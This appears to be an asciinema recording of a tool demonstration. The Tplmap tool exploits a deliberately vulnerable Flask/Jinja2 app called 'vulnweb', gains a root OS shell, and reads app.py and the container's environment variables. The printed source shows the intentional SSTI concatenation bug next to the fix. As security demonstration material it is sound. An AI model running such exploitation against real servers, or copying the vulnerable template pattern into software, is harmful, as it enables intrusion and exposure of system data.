{
  "version": 1,
  "width": 90,
  "height": 25,
  "duration": 30.776832,
  "command": "/bin/bash --rcfile ~/.bash_profile",
  "title": null,
  "env": {
    "TERM": "xterm-256color",
    "SHELL": "/bin/bash"
  },
  "stdout": [
    [
      0.232692,
      "\u001b[?1034h\u001b]0;geese@mb: ~/tools\u0007\u001b[0;32m~/tools\u001b[0m$ "
    ],
    [
      2.0,
      "curl ht"
    ],
    [
      6.5e-05,
      "tp://a"
    ],
    [
      4.1e-05,
      "4b72"
    ],
    [
      4.6e-05,
      "d"
    ],
    [
      8.8e-05,
      "9"
    ],
    [
      0.000371,
      "d8ba02"
    ],
    [
      9.3e-05,
      "11e7"
    ],
    [
      5.2e-05,
      "801"
    ],
    [
      4.5e-05,
      "a0"
    ],
    [
      9.8e-05,
      "6d"
    ],
    [
      5.3e-05,
      "2c"
    ],
    [
      3.9e-05,
      "94"
    ],
    [
      7.1e-05,
      "3"
    ],
    [
      4e-05,
      "2f"
    ],
    [
      3.6e-05,
      "2"
    ],
    [
      3.5e-05,
      "-"
    ],
    [
      2.8e-05,
      "1"
    ],
    [
      6.4e-05,
      "3"
    ],
    [
      3.9e-05,
      "27"
    ],
    [
      4.1e-05,
      "0"
    ],
    [
      3.1e-05,
      "3"
    ],
    [
      3.6e-05,
      "5"
    ],
    [
      3.9e-05,
      "4"
    ],
    [
      3.7e-05,
      "8"
    ],
    [
      3.6e-05,
      "4."
    ],
    [
      0.000153,
      "us-e"
    ],
    [
      8e-05,
      "a"
    ],
    [
      3.4e-05,
      "st"
    ],
    [
      3.7e-05,
      "-"
    ],
    [
      3.7e-05,
      "1"
    ],
    [
      4.2e-05,
      "."
    ],
    [
      4e-05,
      "e"
    ],
    [
      2.6e-05,
      "l"
    ],
    [
      2.9e-05,
      "b"
    ],
    [
      8.5e-05,
      "."
    ],
    [
      5.9e-05,
      "am"
    ],
    [
      3.9e-05,
      "a"
    ],
    [
      0.000112,
      "z"
    ],
    [
      5.1e-05,
      "o"
    ],
    [
      3.8e-05,
      "n"
    ],
    [
      0.000137,
      "aw"
    ],
    [
      8e-05,
      "s"
    ],
    [
      0.000203,
      ".c \rom"
    ],
    [
      6.2e-05,
      ":8000"
    ],
    [
      5.3e-05,
      "/p"
    ],
    [
      5.2e-05,
      "ag"
    ],
    [
      4.3e-05,
      "e?"
    ],
    [
      3.7e-05,
      "n"
    ],
    [
      3.7e-05,
      "am"
    ],
    [
      3.9e-05,
      "e="
    ],
    [
      4.1e-05,
      "B"
    ],
    [
      3.8e-05,
      "r"
    ],
    [
      3.7e-05,
      "ad"
    ],
    [
      0.903487,
      "\r\n"
    ],
    [
      0.033044,
      "Hello Brad!"
    ],
    [
      0.024772,
      "\u001b]0;geese@mb: ~/tools\u0007\u001b[0;32m~/tools\u001b[0m$ "
    ],
    [
      1.225158,
      "curl http://a4b72d9d8ba0211e7801a06d2c9432f2-1327035484.us-east-1.elb.amazonaws.co\rom:8000/page?name=Brad"
    ],
    [
      2.0,
      "2"
    ],
    [
      0.178534,
      "\r\n"
    ],
    [
      0.030095,
      "Hello Brad2!"
    ],
    [
      0.017393,
      "\u001b]0;geese@mb: ~/tools\u0007\u001b[0;32m~/tools\u001b[0m$ "
    ],
    [
      2.0,
      "."
    ],
    [
      0.056293,
      "/"
    ],
    [
      0.134991,
      "t"
    ],
    [
      0.112316,
      "p"
    ],
    [
      0.123222,
      "lmap.py "
    ],
    [
      0.517059,
      "\r\n"
    ],
    [
      0.192321,
      "[+] Tplmap 0.3\r\n    Automatic Server-Side Template Injection Detection and Exploitation Tool\r\n\r\n"
    ],
    [
      0.000132,
      "Usage: python tplmap.py [options]\r\n"
    ],
    [
      3.4e-05,
      "\r\ntplmap.py: error: URL is required. Run with -h for help.\r\n"
    ],
    [
      0.023211,
      "\u001b]0;geese@mb: ~/tools\u0007\u001b[0;32m~/tools\u001b[0m$ "
    ],
    [
      1.824694,
      "./"
    ],
    [
      6.5e-05,
      "tplma"
    ],
    [
      3.1e-05,
      "p."
    ],
    [
      3.5e-05,
      "p"
    ],
    [
      4.3e-05,
      "y "
    ],
    [
      4.1e-05,
      "-u"
    ],
    [
      4.2e-05,
      " h"
    ],
    [
      4.1e-05,
      "tt"
    ],
    [
      4e-05,
      "p:/"
    ],
    [
      4.2e-05,
      "/a"
    ],
    [
      4e-05,
      "4"
    ],
    [
      2.7e-05,
      "b"
    ],
    [
      2.9e-05,
      "7"
    ],
    [
      3.8e-05,
      "2d"
    ],
    [
      4.2e-05,
      "9"
    ],
    [
      4.1e-05,
      "d8"
    ],
    [
      4.2e-05,
      "ba"
    ],
    [
      3.8e-05,
      "02"
    ],
    [
      0.000159,
      "11"
    ],
    [
      6.1e-05,
      "e78"
    ],
    [
      4.7e-05,
      "01"
    ],
    [
      2.9e-05,
      "a"
    ],
    [
      2.7e-05,
      "0"
    ],
    [
      9.5e-05,
      "6d"
    ],
    [
      4.3e-05,
      "2c"
    ],
    [
      3.9e-05,
      "9"
    ],
    [
      4e-05,
      "4"
    ],
    [
      3.7e-05,
      "3"
    ],
    [
      5.1e-05,
      "2"
    ],
    [
      3.1e-05,
      "f"
    ],
    [
      0.000111,
      "2"
    ],
    [
      3.5e-05,
      "-"
    ],
    [
      2.7e-05,
      "1"
    ],
    [
      5.6e-05,
      "3"
    ],
    [
      7.5e-05,
      "27"
    ],
    [
      4.9e-05,
      "0"
    ],
    [
      3.3e-05,
      "3"
    ],
    [
      2.5e-05,
      "5"
    ],
    [
      2.7e-05,
      "4"
    ],
    [
      7e-05,
      "8"
    ],
    [
      4.5e-05,
      "4"
    ],
    [
      4.3e-05,
      "."
    ],
    [
      4.3e-05,
      "u"
    ],
    [
      2.8e-05,
      "s"
    ],
    [
      3e-05,
      "-"
    ],
    [
      4e-05,
      "e"
    ],
    [
      4.1e-05,
      "a"
    ],
    [
      4.1e-05,
      "s"
    ],
    [
      4.1e-05,
      "t"
    ],
    [
      5.8e-05,
      "-"
    ],
    [
      3.7e-05,
      "1."
    ],
    [
      8.3e-05,
      "e"
    ],
    [
      2.9e-05,
      "l"
    ],
    [
      7.5e-05,
      "b"
    ],
    [
      3.7e-05,
      "."
    ],
    [
      7.4e-05,
      "a \rm"
    ],
    [
      2.8e-05,
      "az"
    ],
    [
      3.3e-05,
      "on"
    ],
    [
      3.6e-05,
      "aw"
    ],
    [
      3.6e-05,
      "s.c"
    ],
    [
      3.7e-05,
      "om"
    ],
    [
      3.2e-05,
      ":8"
    ],
    [
      2.5e-05,
      "0"
    ],
    [
      2.4e-05,
      "0"
    ],
    [
      3.6e-05,
      "0"
    ],
    [
      0.000123,
      "/"
    ],
    [
      4.8e-05,
      "pa"
    ],
    [
      0.000103,
      "ge"
    ],
    [
      5.8e-05,
      "?name"
    ],
    [
      4.6e-05,
      "=B"
    ],
    [
      2.9e-05,
      "r"
    ],
    [
      2.6e-05,
      "a"
    ],
    [
      2.5e-05,
      "d"
    ],
    [
      6.6e-05,
      " -"
    ],
    [
      4.8e-05,
      "-o"
    ],
    [
      4.2e-05,
      "s-s"
    ],
    [
      4.1e-05,
      "h"
    ],
    [
      3.3e-05,
      "el"
    ],
    [
      8.4e-05,
      "l"
    ],
    [
      2.0,
      "\r\n"
    ],
    [
      0.186162,
      "[+] Tplmap 0.3\r\n    Automatic Server-Side Template Injection Detection and Exploitation Tool\r\n\r\n"
    ],
    [
      0.000226,
      "[+] Testing if GET parameter 'name' is injectable\r\n"
    ],
    [
      0.000626,
      "[+] Smarty plugin is testing rendering with tag '*'\r\n"
    ],
    [
      0.05282,
      "[+] Smarty plugin is testing blind injection\r\n"
    ],
    [
      0.025079,
      "[+] Mako plugin is testing rendering with tag '${*}'\r\n"
    ],
    [
      0.048206,
      "[+] Mako plugin is testing blind injection\r\n"
    ],
    [
      0.02262,
      "[+] Python plugin is testing rendering with tag 'str(*)'\r\n"
    ],
    [
      0.042009,
      "[+] Python plugin is testing blind injection\r\n"
    ],
    [
      0.022741,
      "[+] Tornado plugin is testing rendering with tag '{{*}}'\r\n"
    ],
    [
      0.054222,
      "[+] Tornado plugin is testing blind injection\r\n"
    ],
    [
      0.027654,
      "[+] Jinja2 plugin is testing rendering with tag '{{*}}'\r\n"
    ],
    [
      0.024059,
      "[+] Jinja2 plugin has confirmed injection with tag '{{*}}'\r\n"
    ],
    [
      0.057572,
      "[+] Tplmap identified the following injection point:\r\n\r\n  GET parameter: name\r\n  Engine: Jinja2\r\n  Injection: {{*}}\r\n  Context: text\r\n  OS: posix-linux2\r\n  Technique: render\r\n  Capabilities:\r\n\r\n   Shell command execution: ok\r\n   Bind and reverse shell: ok\r\n   File write: ok\r\n   File read: ok\r\n   Code evaluation: ok, python code\r\n\r\n"
    ],
    [
      0.000185,
      "[+] Run commands on the operating system.\r\n"
    ],
    [
      0.002142,
      "posix-linux2 $ "
    ],
    [
      1.415488,
      "i"
    ],
    [
      0.04484,
      "d"
    ],
    [
      0.167109,
      "\r\n"
    ],
    [
      0.032388,
      "uid=0(root) gid=0(root) groups=0(root)\r\n"
    ],
    [
      5.4e-05,
      "posix-linux2 $ "
    ],
    [
      0.93686,
      "l"
    ],
    [
      0.067018,
      "s"
    ],
    [
      0.123823,
      " "
    ],
    [
      0.078754,
      "-"
    ],
    [
      0.067397,
      "a"
    ],
    [
      0.146879,
      "l"
    ],
    [
      0.155905,
      "\r\n"
    ],
    [
      0.034753,
      "total 76\r\ndrwxr-xr-x   1 root root 4096 Oct 26 04:01 .\r\ndrwxr-xr-x   1 root root 4096 Oct 26 04:01 ..\r\n-rwxr-xr-x   1 root root    0 Oct 26 04:01 .dockerenv\r\n-rw-r--r--   1 root root  617 Aug  9 20:23 app.py\r\ndrwxr-xr-x   2 root root 4096 Oct 26 04:01 bin\r\ndrwxr-xr-x   2 root root 4096 Jul 13 13:01 boot\r\ndrwxr-xr-x   5 root root  380 Oct 26 04:01 dev\r\ndrwxr-xr-x   1 root root 4096 Oct 26 04:01 etc\r\ndrwxr-xr-x   2 root root 4096 Jul 13 13:01 home\r\ndrwxr-xr-x   9 root root 4096 Oct 26 04:01 lib\r\ndrwxr-xr-x   2 root root 4096 Oct 26 04:01 lib64\r\ndrwxr-xr-x   2 root root 4096 Jul 23 00:00 media\r\ndrwxr-xr-x   2 root root 4096 Jul 23 00:00 mnt\r\ndrwxr-xr-x   2 root root 4096 Jul 23 00:00 opt\r\ndr-xr-xr-x 151 root root    0 Oct 26 04:01 proc\r\ndrwx------   3 root root 4096 Oct 26 04:01 root\r\ndrwxr-xr-x   1 root root 4096 Oct 26 04:01 run\r\ndrwxr-xr-x   2 root root 4096 Oct 26 04:01 sbin\r\ndrwxr-xr-x   2 root root 4096 Jul 23 00:00 srv\r\ndr-xr-xr-x  13 root root    0 Oct 26 04:21 sys\r\ndrwxrwxrwt   2 root root 4096 Aug  9 2"
    ],
    [
      7.9e-05,
      "0:26 tmp\r\ndrwxr-xr-x   1 root root 4096 Oct 26 04:01 usr\r\ndrwxr-xr-x  11 root root 4096 Oct 26 04:01 var\r\n"
    ],
    [
      0.000111,
      "posix-linux2 $ "
    ],
    [
      1.20379,
      "c"
    ],
    [
      0.134829,
      "a"
    ],
    [
      0.090041,
      "t"
    ],
    [
      0.078797,
      " "
    ],
    [
      0.112945,
      "a"
    ],
    [
      0.101207,
      "p"
    ],
    [
      0.145652,
      "p"
    ],
    [
      0.191485,
      "."
    ],
    [
      0.202858,
      "p"
    ],
    [
      0.168245,
      "y"
    ],
    [
      0.201628,
      "\r\n"
    ],
    [
      0.032155,
      "from flask import Flask, request\r\nfrom jinja2 import Environment\r\n\r\napp = Flask(__name__)\r\nJinja2 = Environment()\r\n\r\n@app.route(\"/page\")\r\ndef page():\r\n\r\n    name = request.values.get('name')\r\n    \r\n"
    ],
    [
      0.000235,
      "    # SSTI VULNERABILITY\r\n    # The vulnerability is introduced concatenating the\r\n    # user-provided `name` variable to the template string.\r\n    output = Jinja2.from_string('Hello ' + name + '!').render()\r\n    \r\n    # Instead, the variable should be passed to the template context.\r\n    # Jinja2.from_string('Hello {{name}}!').render(name = name)\r\n\r\n    return output\r\n\r\nif __name__ == \"__main__\":\r\n    app.run(host='0.0.0.0', port=8080)\r\n"
    ],
    [
      5.1e-05,
      "posix-linux2 $ "
    ],
    [
      2.0,
      "e"
    ],
    [
      0.067281,
      "n"
    ],
    [
      0.134889,
      "v"
    ],
    [
      0.088962,
      "\r\n"
    ],
    [
      0.085084,
      "VULNWEB_PORT_8000_TCP=tcp://100.64.100.28:8000\r\nKUBERNETES_PORT=tcp://100.64.0.1:443\r\nKUBERNETES_SERVICE_PORT=443\r\nVULNWEB_PORT=tcp://100.64.100.28:8000\r\nVULNWEB_SERVICE_PORT=8000\r\nHOSTNAME=vulnweb-2569941405-q8v9r\r\nPYTHON_PIP_VERSION=9.0.1\r\nHOME=/root\r\nGPG_KEY=C01E1CAD5EA2C4F0B8E3571504C367C218ADD4FF\r\nKUBERNETES_PORT_443_TCP_ADDR=100.64.0.1\r\nPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\r\nKUBERNETES_PORT_443_TCP_PORT=443\r\nKUBERNETES_PORT_443_TCP_PROTO=tcp\r\nLANG=C.UTF-8\r\nVULNWEB_PORT_8000_TCP_ADDR=100.64.100.28\r\nPYTHON_VERSION=2.7.13\r\nVULNWEB_PORT_8000_TCP_PORT=8000\r\nKUBERNETES_PORT_443_TCP=tcp://100.64.0.1:443\r\nVULNWEB_PORT_8000_TCP_PROTO=tcp\r\nKUBERNETES_SERVICE_PORT_HTTPS=443\r\nKUBERNETES_SERVICE_HOST=100.64.0.1\r\nPWD=/\r\nVULNWEB_SERVICE_HOST=100.64.100.28\r\n"
    ],
    [
      5.5e-05,
      "posix-linux2 $ "
    ],
    [
      2.0,
      "h"
    ],
    [
      0.112476,
      "o"
    ],
    [
      0.011638,
      "s"
    ],
    [
      0.145828,
      "t"
    ],
    [
      0.101217,
      "n"
    ],
    [
      0.090468,
      "a"
    ],
    [
      0.12362,
      "m"
    ],
    [
      0.079206,
      "e"
    ],
    [
      0.099675,
      "\r\n"
    ],
    [
      0.030471,
      "vulnweb-2569941405-q8v9r\r\n"
    ],
    [
      3.5e-05,
      "posix-linux2 $ "
    ],
    [
      2.0,
      "e"
    ],
    [
      0.168566,
      "x"
    ],
    [
      0.123777,
      "i"
    ],
    [
      0.067914,
      "t"
    ],
    [
      0.167579,
      "\r\n"
    ],
    [
      0.033094,
      "\r\n"
    ],
    [
      6.5e-05,
      "posix-linux2 $ "
    ],
    [
      1.407582,
      "[+] Exiting.\r\n"
    ],
    [
      0.036811,
      "\u001b]0;geese@mb: ~/tools\u0007\u001b[0;32m~/tools\u001b[0m$ "
    ],
    [
      1.446254,
      "\r\n"
    ],
    [
      0.012565,
      "\u001b]0;geese@mb: ~/tools\u0007\u001b[0;32m~/tools\u001b[0m$ "
    ]
  ]
}